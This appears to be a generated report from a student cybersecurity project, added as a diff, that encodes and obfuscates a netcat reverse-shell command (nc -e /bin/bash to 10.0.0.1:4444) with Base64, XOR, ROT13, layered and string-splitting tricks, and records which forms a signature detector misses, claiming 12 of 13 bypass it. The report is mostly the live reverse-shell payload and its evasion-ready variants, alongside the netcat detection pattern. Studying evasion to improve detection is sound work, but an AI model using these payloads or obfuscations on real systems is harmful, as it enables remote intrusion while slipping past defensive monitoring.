@@ -1,0 +1,112 @@
+══════════════════════════════════════════════════════════════════════
+  CUSTOM PAYLOAD ENCODER & OBFUSCATION FRAMEWORK
+  Unified Mentor — Cybersecurity Project 2
+  Report Generated : June 2026
+  XOR Key          : 0x41 (65)
+══════════════════════════════════════════════════════════════════════
+
+  [ORIGINAL PAYLOAD]
+──────────────────────────────────────────────────────────────────────
+  Payload  : nc -e /bin/bash 10.0.0.1 4444
+  Verdict  : DETECTED
+  Matched  : /bin/bash, ncs+-[el]
+
+══════════════════════════════════════════════════════════════════════
+  ENCODING & OBFUSCATION RESULTS
+══════════════════════════════════════════════════════════════════════
+
+  [Base64 Encoded]
+──────────────────────────────────────────────────────────────────────
+  Output   : bmMgLWUgL2Jpbi9iYXNoIDEwLjAuMC4xIDQ0NDQ=
+  Verdict  : BYPASSED
+
+  [XOR Encoded (key=0x41)]
+──────────────────────────────────────────────────────────────────────
+  Output   : 2f22616c24616e23282f6e232032296170716f716f716f706175757575
+  Verdict  : BYPASSED
+
+  [ROT13 Encoded]
+──────────────────────────────────────────────────────────────────────
+  Output   : ap -r /ova/onfu 10.0.0.1 4444
+  Verdict  : BYPASSED
+
+  [Base64 → XOR (multi-layer)]
+──────────────────────────────────────────────────────────────────────
+  Output   : 232c0c260d1614260d730b312328782818190f2e080504360d2b00340c027539080510710f05107c
+  Verdict  : BYPASSED
+
+  [ROT13 → Base64 (multi-layer)]
+──────────────────────────────────────────────────────────────────────
+  Output   : YXAgLXIgL292YS9vbmZ1IDEwLjAuMC4xIDQ0NDQ=
+  Verdict  : BYPASSED
+
+  [XOR → Base64 → ROT13 (3-layer)]
+──────────────────────────────────────────────────────────────────────
+  Output   : ZzLlZwLkAzZlAQLkAzHlZmV4ZzL2MGVmZwNmZwV5AwR3ZQpkAzL3ZGMzAmR2MwpjAwR3AGp1AmH3AD==
+  Verdict  : BYPASSED
+
+  [Obfuscation: Random Char Insertion]
+──────────────────────────────────────────────────────────────────────
+  Output   : nc+ &-e /:b$i=n/bash 10.:0._0.%1 44;44
+  Verdict  : BYPASSED
+
+  [Obfuscation: Split & Concat]
+──────────────────────────────────────────────────────────────────────
+  Output   : "nc " + "-e " + "/bi" + "n/b" + "ash" + " 10" + ".0." + "0.1" + " 44" + "44"
+  Verdict  : BYPASSED
+
+  [Obfuscation: Hex Escape Sequences]
+──────────────────────────────────────────────────────────────────────
+  Output   : \x6e\x63 -e /b\x69\x6e/\x62ash 10.\x30.\x30.1 \x34\x3444
+  Verdict  : BYPASSED
+
+  [Obfuscation: String Reversal]
+──────────────────────────────────────────────────────────────────────
+  Output   : 4444 1.0.0.01 hsab/nib/ e- cn
+  Verdict  : BYPASSED
+
+  [Obfuscation: Case Swap]
+──────────────────────────────────────────────────────────────────────
+  Output   : NC -E /BIN/BASH 10.0.0.1 4444
+  Verdict  : DETECTED
+  Matched  : /bin/bash, ncs+-[el]
+
+  [Base64 + Escape Obfuscation (hybrid)]
+──────────────────────────────────────────────────────────────────────
+  Output   : b\x6dM\x67\x4c\x57\x55gL\x32\x4ap\x62i9\x69\x59X\x4eo\x49\x44Ew\x4c\x6aA\x75M\x43\x34\x78I\x44\x5...
+  Verdict  : BYPASSED
+
+  [XOR + Split-Concat Obfuscation (hybrid)]
+──────────────────────────────────────────────────────────────────────
+  Output   : "2f22" + "616c" + "2461" + "6e23" + "282f" + "6e23" + "2032" + "2961" + "7071" + "6f71" + "6f71" ...
+  Verdict  : BYPASSED
+
+══════════════════════════════════════════════════════════════════════
+  EVASION EFFECTIVENESS SUMMARY
+══════════════════════════════════════════════════════════════════════
+
+  Technique                                Verdict      Matches
+  ────────────────────────────────────────────────────────────────────
+  Base64 Encoded                           BYPASSED     0
+  XOR Encoded (key=0x41)                   BYPASSED     0
+  ROT13 Encoded                            BYPASSED     0
+  Base64 → XOR (multi-layer)               BYPASSED     0
+  ROT13 → Base64 (multi-layer)             BYPASSED     0
+  XOR → Base64 → ROT13 (3-layer)           BYPASSED     0
+  Obfuscation: Random Char Insertion       BYPASSED     0
+  Obfuscation: Split & Concat              BYPASSED     0
+  Obfuscation: Hex Escape Sequences        BYPASSED     0
+  Obfuscation: String Reversal             BYPASSED     0
+  Obfuscation: Case Swap                   DETECTED     2
+  Base64 + Escape Obfuscation (hybrid)     BYPASSED     0
+  XOR + Split-Concat Obfuscation (hybrid)  BYPASSED     0
+
+  ────────────────────────────────────────────────────────────────────
+  Original Payload Detected  : YES ⚠
+  Techniques Tested          : 13
+  Detection Bypassed         : 12/13  (92.3%)
+  Still Detected             : 1/13  (7.7%)
+
+══════════════════════════════════════════════════════════════════════
+  END OF REPORT
+══════════════════════════════════════════════════════════════════════
